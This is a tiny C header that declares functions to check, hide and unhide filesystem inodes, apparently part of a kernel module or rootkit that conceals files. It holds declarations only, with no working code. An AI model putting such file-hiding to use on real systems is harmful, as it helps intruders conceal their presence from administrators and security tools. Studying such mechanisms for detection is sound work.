#ifndef __HIDE_FILE
#define __HIDE_FILE

int is_inode_hidden(u64);
void hide_inode(u64);
void unhide_inode(u64);

#endif